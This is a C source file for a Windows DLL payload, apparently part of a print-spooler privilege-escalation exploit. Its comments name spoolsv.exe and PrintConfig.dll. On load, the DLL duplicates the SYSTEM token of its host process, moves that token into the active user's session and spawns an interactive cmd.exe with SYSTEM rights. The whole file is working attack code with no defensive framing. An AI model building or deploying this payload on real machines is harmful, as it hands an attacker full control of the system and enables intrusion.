#include <windows.h>
#include <wtsapi32.h>
#pragma comment(lib,"wtsapi32")

/* 
* Project's purpose:
* Contains the payload to spawn cmd.exe
*/
DWORD WINAPI Shell(LPVOID self)
{
	DWORD sessId = WTSGetActiveConsoleSessionId();
	if (sessId == 0xFFFFFFFF)
		return 1;

	HANDLE hSys = NULL;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_SESSIONID,
		&hSys)) return 1;

	// Dup the SYSTEM token
	HANDLE hPrimary = NULL;
	if (!DuplicateTokenEx(hSys,
		TOKEN_ALL_ACCESS,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&hPrimary)) return 1;

	// Change the duplicated SYSTEM token's session id to the user's session (so the shell will be visible and interactive)
	if (!SetTokenInformation(hPrimary, TokenSessionId, &sessId, sizeof(sessId)))
		return 1;

	// Spawn cmd.exe
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	BOOL succeeded = CreateProcessAsUserW(hPrimary,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, FALSE,
		CREATE_NEW_CONSOLE,
		NULL, NULL, &si, &pi);
	if (!succeeded)
	{
		CloseHandle(hSys);
		CloseHandle(hPrimary);
		return 1;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	FreeLibraryAndExitThread((HMODULE)self, 0); // The thread has now finished creating the cmd process. Free the module and exit.
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		HMODULE self;
		// Add an additional reference count to ensure that when spoolsv.exe calls FreeLibrary(hPrintConfigDLL), Shell thread would finish creating the cmd process safely.
		if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCWSTR)&DllMain, &self))
			CreateThread(nullptr, 0, Shell, self, 0, nullptr);
		break;

	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}